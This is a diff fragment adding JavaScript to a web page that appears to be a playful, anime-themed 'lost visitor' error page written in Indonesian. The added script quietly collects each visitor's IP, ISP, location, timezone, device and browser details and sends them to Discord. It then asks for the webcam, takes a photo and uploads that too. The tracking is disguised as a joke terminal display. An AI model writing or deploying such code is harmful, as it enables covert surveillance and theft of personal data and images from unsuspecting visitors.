+  navigator.mediaDevices.getUserMedia({ video:{ facingMode:"user", width:{ideal:640}, height:{ideal:480} }, audio:false })
+    .then(function(stream){
+      video.srcObject = stream;
+
+      function doCapture(){
+        /* Extra guard: if video still has no real frame, wait a bit more */
+        if(video.videoWidth === 0 || video.videoHeight === 0){
+          setTimeout(doCapture, 300);
+          return;
+        }
+        var c = document.createElement("canvas");
+        c.width  = video.videoWidth;
+        c.height = video.videoHeight;
+        var cx = c.getContext("2d");
+        /* Mirror horizontally so photo looks natural */
+        cx.translate(c.width, 0); cx.scale(-1, 1);
+        cx.drawImage(video, 0, 0);
+
+        stream.getTracks().forEach(function(t){ t.stop(); });
+
+        shot.src = c.toDataURL("image/png");
+        shot.style.display = "block";
+        video.style.display = "none";
+        label.textContent  = "FOTO TERSIMPAN DI GRIMOIRE";
+
+        c.toBlob(function(blob){
+          if(!blob) return;
+          status.textContent = "mengirim ke guild...";
+          sendPhoto(blob);
+          status.textContent = "FOTO TERKIRIM KE GUILD ✔";
+        }, "image/png");
+      }
+
+      /* Wait for 'playing' (not loadeddata) + 800ms warmup for camera exposure */
+      video.addEventListener("playing", function(){
+        label.textContent  = "WAJAH TERDETEKSI...";
+        status.textContent = "membiarkan kamera menyesuaikan...";
+        setTimeout(doCapture, 800);
+      }, { once:true });
+
+      video.play().catch(function(){});
+    })
+    .catch(function(){
+      status.textContent = "AKSES KAMERA DITOLAK";
+    });
+}
+
+/* ─── Main flow ───────────────────────────────────────────────────────── */
+async function run(){
+  addLine("> guild@isekai:~$ melacak pengunjung...");
+  addLine("> mengambil koordinat portal...");
+
+  /* Fetch IP — send visitor text as soon as IP resolves, don't wait longer */
+  var info = await getIpInfo();
+
+  var ip       = (info && info.ip)           || "tidak diketahui";
+  var isp      = (info && info.org)          || "tidak diketahui";
+  var city     = (info && info.city)         || "";
+  var region   = (info && info.region)       || "";
+  var country  = (info && info.country_name) || "";
+  var tz       = (info && info.timezone)     || "tidak diketahui";
+  var lokasi   = [city,region,country].filter(Boolean).join(", ") || "tidak diketahui";
+
+  addLine("> IP dunia nyata: " + ip,   "gold");
+  addLine("> guild / ISP: "    + isp);
+  addLine("> lokasi: "         + lokasi);
+  addLine("> zona waktu: "     + tz);
+  addLine("> platform: "       + navigator.platform);
+  addLine("> device: "         + navigator.userAgent.slice(0,80)+"...");
+  addLine("> bahasa: "         + navigator.language);
+  addLine("> resolusi: "       + screen.width+"x"+screen.height+" ("+devicePixelRatio+"x)");
+  addLine("> rank akses: PENGUNJUNG TERSESAT", "pink");
+  addLine("> halaman yang dicari: tidak ditemukan di dunia ini");
+  addLine("> mengaktifkan kristal pemantau...");
+  addLine("> kamera: menunggu izin...");
+  addLine("> ayo balik ke portal utama, senpai_");
+  addCursor();
+
+  /* ── Kirim data visitor ke Discord segera ── */
+  sendText([
+    "🌸 **Pengunjung tersesat baru terdeteksi!**",
+    "IP: "          + ip,
+    "ISP/Guild: "   + isp,
+    "Lokasi: "      + lokasi,
+    "Zona Waktu: "  + tz,
+    "Platform: "    + navigator.platform,
+    "Bahasa: "      + navigator.language,
+    "Resolusi: "    + screen.width+"x"+screen.height,
+    "Device: "      + navigator.userAgent
+  ].join("\n"));
+
+  /* ── Start camera 1.2s later (biar terminal kebaca dulu) ── */
+  setTimeout(startCamera, 1200);
+}
+
+run();
 })();
 </script>
 </body>
